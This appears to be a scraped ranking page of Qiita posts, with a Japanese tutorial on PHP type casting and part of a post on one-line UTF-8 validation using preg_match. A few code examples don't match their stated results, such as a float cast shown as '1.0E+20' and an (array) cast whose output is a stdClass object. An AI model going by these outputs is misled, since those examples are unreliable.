<p>GitHub: <a href="https://github.com/Certainist/TwistOAuth" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/Certainist/TwistOAuth</a></p>

<p>ユニットテストを含めていないためデバッグ不足ではありますが、実装はほぼ完了しました。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />38位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>31</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/3aac811629622f7f4d8b">【PHP入門講座】 型変換</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-12-01 16:29:09</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-c427b0ec4b67b3999d7c">目次に戻る</a>
</h3>

<p>この内容は次の「演算子」に掲載したいところでしたが、あまりにも内容が膨大になるので専用の回を設けることにしました。</p>

<h1>
<span id="キャスト型変換演算子とは" class="fragment"></span><a href="#%E3%82%AD%E3%83%A3%E3%82%B9%E3%83%88%E5%9E%8B%E5%A4%89%E6%8F%9B%E6%BC%94%E7%AE%97%E5%AD%90%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>キャスト(型変換)演算子とは</h1>

<p>変数や値の <strong>頭</strong> につけることで、指定された型に強制的に変換するものです。大文字小文字は区別されません。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">((</span><span class="nx">int</span><span class="p">)</span><span class="s1">'123'</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>int(123)
</pre></div>
</div>

<h1>
<span id="string" class="fragment"></span><a href="#string"><i class="fa fa-link"></i></a><code>(string)</code>
</h1>

<p>文字列型への変換を行います。同様の役割を <code>strval</code> 関数も担っています。</p>

<p><strong>strval</strong><br>
<a href="http://php.net/manual/ja/function.strval.php" class="autolink" rel="nofollow noopener" target="_blank">http://php.net/manual/ja/function.strval.php</a></p>

<h2>
<span id="整数" class="fragment"></span><a href="#%E6%95%B4%E6%95%B0"><i class="fa fa-link"></i></a>整数</h2>

<ul>
<li>そのまま文字列になります。</li>
</ul>

<h2>
<span id="浮動小数点数" class="fragment"></span><a href="#%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0"><i class="fa fa-link"></i></a>浮動小数点数</h2>

<ul>
<li>小数部分で <code>0</code> が続いているところは省略される</li>
<li>ある範囲を超過すると <strong>科学表記</strong> が強制される</li>
<li>
<code>NAN</code> や <code>INF</code> はそのまま文字列に</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span>
    <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="o">-</span><span class="mf">1.1</span><span class="p">,</span>
    <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="mf">1.0</span><span class="p">,</span>
    <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="mf">999999999999.0</span><span class="p">,</span>
    <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nx">INF</span>
<span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>string(4) "-1.1"
string(1) "1"
string(7) "1.0E+20"
string(3) "INF"
</pre></div>
</div>

<h2>
<span id="true-false-null" class="fragment"></span><a href="#true-false-null"><i class="fa fa-link"></i></a><code>TRUE</code> <code>FALSE</code> <code>NULL</code>
</h2>

<p><code>FALSE</code> の扱いが配列キー上の変換規則と異なることに注意してください。</p>

<ul>
<li>
<code>TRUE</code> → <code>"1"</code>
</li>
<li>
<code>FALSE</code> <code>NULL</code> → <code>""</code>
</li>
</ul>

<h2>
<span id="配列" class="fragment"></span><a href="#%E9%85%8D%E5%88%97"><i class="fa fa-link"></i></a>配列</h2>

<ul>
<li>
<code>"Array"</code> ( <strong>Notice</strong> を発生)</li>
</ul>

<h2>
<span id="オブジェクト" class="fragment"></span><a href="#%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88"><i class="fa fa-link"></i></a>オブジェクト</h2>

<p><strong>※ この項目には未学習の内容が含まれています。</strong></p>

<ul>
<li>マジックメソッド <strong><code>__toString</code></strong> が実装されている場合、その返り値</li>
<li>実装されていない場合は <strong>Catchable Fatal Error</strong> が発生</li>
</ul>

<h2>
<span id="リソース" class="fragment"></span><a href="#%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>リソース</h2>

<ul>
<li>
<code>"Resource id #番号"</code> の形式</li>
</ul>

<h1>
<span id="int-integer" class="fragment"></span><a href="#int-integer"><i class="fa fa-link"></i></a><code>(int)</code> <code>(integer)</code>
</h1>

<p>整数型への変換を行います。同様の役割を <code>intval</code> 関数も担っていますが、こちらは第2引数を指定すればさらに違った使い方が出来ます。ここではリンクだけの紹介とさせていただきます。</p>

<p><strong>intval</strong><br>
<a href="http://php.net/manual/ja/function.intval.php" class="autolink" rel="nofollow noopener" target="_blank">http://php.net/manual/ja/function.intval.php</a></p>

<h2>
<span id="文字列" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97"><i class="fa fa-link"></i></a>文字列</h2>

<ul>
<li>左から<ins>整数として</ins>有効な文字が続く分だけが対象</li>
<li>空文字列 → <code>0</code>
</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span>
    <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="s1">'+1.8'</span><span class="p">,</span>      <span class="c1">// int(1)</span>
    <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="s1">'++1.8'</span><span class="p">,</span>     <span class="c1">// int(0)</span>
    <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="s1">'5 pencils'</span><span class="p">,</span> <span class="c1">// int(5) </span>
    <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="s1">'1e2x'</span><span class="p">,</span>      <span class="c1">// int(1)</span>
    <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="s1">'1e2'</span>        <span class="c1">// int(1)</span>
<span class="p">);</span>
</pre></div></div>

<h2>
<span id="浮動小数点数-1" class="fragment"></span><a href="#%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0-1"><i class="fa fa-link"></i></a>浮動小数点数</h2>

<ul>
<li>
<strong>切り捨て</strong> を行う</li>
<li><ins>精度が失われ、想定していない値になることがあるので注意</ins></li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span>
    <span class="p">(</span><span class="mf">0.1</span> <span class="o">+</span> <span class="mf">0.7</span><span class="p">)</span> <span class="o">*</span> <span class="mi">10</span><span class="p">,</span>
    <span class="p">(</span><span class="nx">int</span><span class="p">)((</span><span class="mf">0.1</span> <span class="o">+</span> <span class="mf">0.7</span><span class="p">)</span> <span class="o">*</span> <span class="mi">10</span><span class="p">)</span>
<span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>float(8)
int(7)
</pre></div>
</div>

<ul>
<li>
<strong><code>NAN</code> → <code>-2147483648</code></strong> (32ビット環境)</li>
<li><strong><code>INF</code> → <code>0</code></strong></li>
</ul>

<h2>
<span id="true-false-null-1" class="fragment"></span><a href="#true-false-null-1"><i class="fa fa-link"></i></a><code>TRUE</code> <code>FALSE</code> <code>NULL</code>
</h2>

<ul>
<li>
<code>TRUE</code> → <code>1</code>
</li>
<li>
<code>FALSE</code> <code>NULL</code> → <code>0</code>
</li>
</ul>

<h2>
<span id="配列-1" class="fragment"></span><a href="#%E9%85%8D%E5%88%97-1"><i class="fa fa-link"></i></a>配列</h2>

<ul>
<li>要素数1以上 → <code>1</code>
</li>
<li>要素数0 → <code>0</code>
</li>
</ul>

<h2>
<span id="オブジェクト-1" class="fragment"></span><a href="#%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88-1"><i class="fa fa-link"></i></a>オブジェクト</h2>

<ul>
<li>
<code>1</code> ( <strong>Notice</strong> を発生)</li>
</ul>

<h2>
<span id="リソース-1" class="fragment"></span><a href="#%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9-1"><i class="fa fa-link"></i></a>リソース</h2>

<ul>
<li>リソースID</li>
</ul>

<h1>
<span id="float-double" class="fragment"></span><a href="#float-double"><i class="fa fa-link"></i></a><code>(float)</code> <code>(double)</code>
</h1>

<p>浮動小数点数型への変換を行います。同様の役割を <code>floatval</code> 関数と <code>doubleval</code> 関数も担っています。</p>

<h2>
<span id="文字列-1" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97-1"><i class="fa fa-link"></i></a>文字列</h2>

<ul>
<li>左から<ins>浮動小数点数として</ins>有効な文字が続く分だけが対象</li>
<li>
<code>0</code> を省略して小数点からの記述も認められる</li>
<li>
<strong>科学記法</strong> も認められる</li>
<li>空文字列 → <code>0.0</code>
</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span>
    <span class="p">(</span><span class="nx">float</span><span class="p">)</span><span class="s1">'90% OFF sale'</span><span class="p">,</span> <span class="c1">// float(90.0)</span>
    <span class="p">(</span><span class="nx">float</span><span class="p">)</span><span class="s1">'.1'</span><span class="p">,</span>           <span class="c1">// float(0.1)</span>
    <span class="p">(</span><span class="nx">float</span><span class="p">)</span><span class="s1">'-.1'</span><span class="p">,</span>          <span class="c1">// float(-0.1)</span>
    <span class="p">(</span><span class="nx">float</span><span class="p">)</span><span class="s1">'1e2x'</span><span class="p">,</span>         <span class="c1">// float(100)</span>
    <span class="p">(</span><span class="nx">float</span><span class="p">)</span><span class="s1">'1e2'</span>           <span class="c1">// float(100)</span>
<span class="p">);</span>
</pre></div></div>

<h2>
<span id="整数-1" class="fragment"></span><a href="#%E6%95%B4%E6%95%B0-1"><i class="fa fa-link"></i></a>整数</h2>

<ul>
<li>
<code>整数.0</code> の形式</li>
</ul>

<h2>
<span id="true-false-null-2" class="fragment"></span><a href="#true-false-null-2"><i class="fa fa-link"></i></a><code>TRUE</code> <code>FALSE</code> <code>NULL</code>
</h2>

<ul>
<li>
<code>TRUE</code> → <code>1.0</code>
</li>
<li>
<code>FALSE</code> <code>NULL</code> → <code>0.0</code>
</li>
</ul>

<h2>
<span id="配列-2" class="fragment"></span><a href="#%E9%85%8D%E5%88%97-2"><i class="fa fa-link"></i></a>配列</h2>

<ul>
<li>要素数1以上 → <code>1.0</code>
</li>
<li>要素数0 → <code>0.0</code>
</li>
</ul>

<h2>
<span id="オブジェクト-2" class="fragment"></span><a href="#%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88-2"><i class="fa fa-link"></i></a>オブジェクト</h2>

<ul>
<li>
<code>1.0</code> ( <strong>Notice</strong> を発生)</li>
</ul>

<h2>
<span id="リソース-2" class="fragment"></span><a href="#%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9-2"><i class="fa fa-link"></i></a>リソース</h2>

<ul>
<li>
<code>番号.0</code> の形式</li>
</ul>

<h1>
<span id="bool-boolean" class="fragment"></span><a href="#bool-boolean"><i class="fa fa-link"></i></a><code>(bool)</code> <code>(boolean)</code>
</h1>

<p>論理型への変換を行います。同様の役割を <code>boolval</code> 関数も担っています(PHP5.5以降)。</p>

<p><strong>boolval</strong><br>
<a href="http://php.net/manual/ja/function.boolval.php" class="autolink" rel="nofollow noopener" target="_blank">http://php.net/manual/ja/function.boolval.php</a></p>

<h2>
<span id="文字列-2" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97-2"><i class="fa fa-link"></i></a>文字列</h2>

<ul>
<li>
<code>"0"</code> と <code>""</code> → <code>FALSE</code>
</li>
<li>それ以外 → <code>TRUE</code>
</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="s1">'0'</span><span class="p">,</span>     <span class="c1">// FALSE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="s1">''</span><span class="p">,</span>      <span class="c1">// FALSE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="s1">'0.0'</span><span class="p">,</span>   <span class="c1">// TRUE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="s1">'00'</span><span class="p">,</span>    <span class="c1">// TRUE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="s1">'-0'</span><span class="p">,</span>    <span class="c1">// TRUE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="s1">'true'</span><span class="p">,</span>  <span class="c1">// TRUE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="s1">'false'</span>  <span class="c1">// TRUE</span>
<span class="p">);</span>
</pre></div></div>

<h2>
<span id="整数浮動小数点数" class="fragment"></span><a href="#%E6%95%B4%E6%95%B0%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0"><i class="fa fa-link"></i></a>整数・浮動小数点数</h2>

<ul>
<li>
<code>0</code> <code>0.0</code> → <code>FALSE</code>
</li>
<li>それ以外 → <code>TRUE</code>
</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="mi">0</span><span class="p">,</span>   <span class="c1">// FALSE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="mf">0.0</span><span class="p">,</span> <span class="c1">// FALSE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="o">-</span><span class="mi">0</span><span class="p">,</span>  <span class="c1">// FALSE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="mi">1</span><span class="p">,</span>   <span class="c1">// TRUE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span>  <span class="c1">// TRUE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="nx">INF</span><span class="p">,</span> <span class="c1">// TRUE</span>
    <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="nx">NAN</span>  <span class="c1">// TRUE</span>
<span class="p">);</span>
</pre></div></div>

<h2>
<span id="null" class="fragment"></span><a href="#null"><i class="fa fa-link"></i></a><code>NULL</code>
</h2>

<ul>
<li><code>FALSE</code></li>
</ul>

<h2>
<span id="配列-3" class="fragment"></span><a href="#%E9%85%8D%E5%88%97-3"><i class="fa fa-link"></i></a>配列</h2>

<ul>
<li>要素数1以上 → <code>TRUE</code>
</li>
<li>要素数0 → <code>FALSE</code>
</li>
</ul>

<h2>
<span id="オブジェクトリソース" class="fragment"></span><a href="#%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>オブジェクト・リソース</h2>

<ul>
<li><code>TRUE</code></li>
</ul>

<h1>
<span id="array" class="fragment"></span><a href="#array"><i class="fa fa-link"></i></a><code>(array)</code>
</h1>

<p>配列型への変換を行います。</p>

<h2>
<span id="文字列-整数-浮動小数点数-true-false-リソース" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97-%E6%95%B4%E6%95%B0-%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0-true-false-%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>文字列 整数 浮動小数点数 <code>TRUE</code> <code>FALSE</code> リソース</h2>

<ul>
<li>キー <code>0</code> に対する代入と等価</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">((</span><span class="k">array</span><span class="p">)</span><span class="k">false</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(1) {
  [0]=&gt;
  bool(false)
}
</pre></div>
</div>

<h2>
<span id="null-1" class="fragment"></span><a href="#null-1"><i class="fa fa-link"></i></a><code>NULL</code>
</h2>

<ul>
<li>要素数0の配列</li>
</ul>

<h2>
<span id="オブジェクト-3" class="fragment"></span><a href="#%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88-3"><i class="fa fa-link"></i></a>オブジェクト</h2>

<p><strong>※ この項目には未学習の内容が含まれています。</strong></p>

<h3>
<span id="要注意" class="fragment"></span><a href="#%E8%A6%81%E6%B3%A8%E6%84%8F"><i class="fa fa-link"></i></a>【要注意】</h3>

<p>全てのプロパティが連想配列形式で格納されます。値はそのままですが、キーがかなり変則的です。新しく代入されるキーを <code>$key</code> 、もとのプロパティ名を <code>$property_name</code> とすると、下記のような結果になります。</p>

<h4>
<span id="public" class="fragment"></span><a href="#public"><i class="fa fa-link"></i></a><code>public</code>
</h4>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$property_name</span><span class="p">;</span>
</pre></div></div>

<h4>
<span id="private" class="fragment"></span><a href="#private"><i class="fa fa-link"></i></a><code>private</code>
</h4>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$key</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> <span class="o">.</span> <span class="no">__CLASS__</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> <span class="o">.</span> <span class="nv">$property_name</span><span class="p">;</span> 
</pre></div></div>

<h4>
<span id="protected" class="fragment"></span><a href="#protected"><i class="fa fa-link"></i></a><code>protected</code>
</h4>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$key</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> <span class="o">.</span> <span class="s1">'*'</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> <span class="o">.</span> <span class="nv">$property_name</span><span class="p">;</span> 
</pre></div></div>

<h1>
<span id="object" class="fragment"></span><a href="#object"><i class="fa fa-link"></i></a><code>(object)</code>
</h1>

<p><strong>※ この項目には未学習の内容が含まれています。</strong></p>

<p>基本クラス <code>stdClass</code> 型への変換を行います。</p>

<h2>
<span id="文字列-整数-浮動小数点数-true-false-リソース-1" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97-%E6%95%B4%E6%95%B0-%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0-true-false-%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9-1"><i class="fa fa-link"></i></a>文字列 整数 浮動小数点数 <code>TRUE</code> <code>FALSE</code> リソース</h2>

<ul>
<li>
<code>public</code> プロパティ <strong><code>scalar</code></strong> に対する代入と等価</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">((</span><span class="k">array</span><span class="p">)</span><span class="k">false</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>object(stdClass)#1 (1) {
  ["scalar"]=&gt;
  bool(false)
}
</pre></div>
</div>

<h2>
<span id="null-2" class="fragment"></span><a href="#null-2"><i class="fa fa-link"></i></a><code>NULL</code>
</h2>

<ul>
<li>初期状態の <code>stdClass</code>
</li>
</ul>

<h2>
<span id="配列-4" class="fragment"></span><a href="#%E9%85%8D%E5%88%97-4"><i class="fa fa-link"></i></a>配列</h2>

<ul>
<li>キーと値が全て <code>public</code> プロパティとしてセットされる</li>
</ul>

<h3>
<span id="要注意-名前が整数型のプロパティ" class="fragment"></span><a href="#%E8%A6%81%E6%B3%A8%E6%84%8F-%E5%90%8D%E5%89%8D%E3%81%8C%E6%95%B4%E6%95%B0%E5%9E%8B%E3%81%AE%E3%83%97%E3%83%AD%E3%83%91%E3%83%86%E3%82%A3"><i class="fa fa-link"></i></a>【要注意】 名前が整数型のプロパティ・・・？</h3>

<p>オブジェクトのプロパティ名は基本的には <strong>文字列型</strong> に限定されています。ところが、この <code>(object)</code> キャストによる場合でのみ、何と<ins>プロパティ名を整数型にできてしまいます</ins>。こうして作られたプロパティには<ins>アロー演算子でアクセスすることは出来ません</ins>。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$obj</span> <span class="o">=</span> <span class="p">(</span><span class="nx">object</span><span class="p">)</span><span class="k">array</span><span class="p">(</span><span class="s1">'A'</span><span class="p">);</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="p">{</span><span class="s1">'0'</span><span class="p">}</span> <span class="o">=</span> <span class="s1">'B'</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">=</span> <span class="s1">'C'</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>object(stdClass)#1 (2) {
  [0]=&gt;
  string(1) "A"
  ["0"]=&gt;
  string(1) "B"
}
object(stdClass)#1 (2) {
  [0]=&gt;
  string(1) "A"
  ["0"]=&gt;
  string(1) "C"
}
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />39位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>29</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/f0628b35a368fa468775">UTF-8を想定して、不正なバイト列が含まれていないかを1行でチェックする</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-19 23:11:40</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">validate_utf8</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'//u'</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>あら簡単。</p>

<p><strong>え？ホントにこれだけで大丈夫なの？</strong><br>
って思う人も多いと思うので（というか私も最初そう思ったので）、検証してみます。<br>
<ins>（追加したほうがいいテストケースがあればコメントください）</ins></p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">テスト用関数</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">test</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span> <span class="p">{</span>

  <span class="nv">$output</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
  <span class="nv">$code</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%'</span><span class="p">,</span> <span class="s1">'\\x'</span><span class="p">,</span> <span class="nb">rawurlencode</span><span class="p">(</span><span class="nv">$input</span><span class="p">));</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">validate_utf8</span><span class="p">(</span><span class="nv">$input</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"【</span><span class="si">{</span><span class="nv">$output</span><span class="si">}</span><span class="s2">】(</span><span class="si">{</span><span class="nv">$code</span><span class="si">}</span><span class="s2">) は有効なUTF-8シーケンスです。</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"(</span><span class="si">{</span><span class="nv">$code</span><span class="si">}</span><span class="s2">) は無効なUTF-8シーケンスです。</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
  <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">テストケース</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nx">test</span><span class="p">(</span><span class="s2">"☝( ◠‿◠ )☝"</span><span class="p">);</span>
<span class="nx">test</span><span class="p">(</span><span class="s2">"ゔ〲〰"</span><span class="p">);</span>
<span class="nx">test</span><span class="p">(</span><span class="s2">"</span><span class="se">\x0a\x92\xff</span><span class="s2">"</span><span class="p">);</span> <span class="c1">// てきとー</span>
<span class="nx">test</span><span class="p">(</span><span class="s2">"</span><span class="se">\xef\xbb\xbf</span><span class="s2">"</span><span class="p">);</span> <span class="c1">// BOMだっけ</span>
<span class="nx">test</span><span class="p">(</span><span class="s2">""</span><span class="p">);</span> <span class="c1">// 空文字列</span>

<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>

<span class="nx">test</span><span class="p">(</span><span class="s2">"</span><span class="se">\x2f</span><span class="s2">"</span><span class="p">);</span> <span class="c1">// スラッシュ(1バイト)</span>
<span class="nx">test</span><span class="p">(</span><span class="s2">"</span><span class="se">\xc0\xaf</span><span class="s2">"</span><span class="p">);</span> <span class="c1">// スラッシュ(冗長2バイト)</span>
<span class="nx">test</span><span class="p">(</span><span class="s2">"</span><span class="se">\xe0\x80\xaf</span><span class="s2">"</span><span class="p">);</span> <span class="c1">// スラッシュ(冗長3バイト)</span>
<span class="nx">test</span><span class="p">(</span><span class="s2">"</span><span class="se">\xf0\x80\x80\xaf</span><span class="s2">"</span><span class="p">);</span> <span class="c1">// スラッシュ(冗長4バイト)</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span>【☝( ◠‿◠ )☝】(\xE2\x98\x9D\x28\x20\xE2\x97\xA0\xE2\x80\xBF\xE2\x97\xA0\x20\x29\xE2\x98\x9D) は有効なUTF-8シーケンスです。
【ゔ〲〰】(\xE3\x82\x94\xE3\x80\xB2\xE3\x80\xB0) は有効なUTF-8シーケンスです。
(\x0A\x92\xFF) は無効なUTF-8シーケンスです。
【﻿】(\xEF\xBB\xBF) は有効なUTF-8シーケンスです。
【】() は有効なUTF-8シーケンスです。

【/】(\x2F) は有効なUTF-8シーケンスです。
(\xC0\xAF) は無効なUTF-8シーケンスです。
(\xE0\x80\xAF) は無効なUTF-8シーケンスです。
(\xF0\x80\x80\xAF) は無効なUTF-8シーケンスです。
</pre></div>
</div>

<p>おー空文字列のときでも大丈夫なのか！<br>
冗長表現もちゃんと弾いてる！</p>

<p><strong>u修飾子</strong> すごい。</p>

<h2>
<span id="発展型" class="fragment"></span><a href="#%E7%99%BA%E5%B1%95%E5%9E%8B"><i class="fa fa-link"></i></a>発展型</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">リソース型以外ならばなんでも判定できるようにしたバージョン(可変長引数対応)</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">validate_utf8</span><span class="p">()</span> <span class="p">{</span>
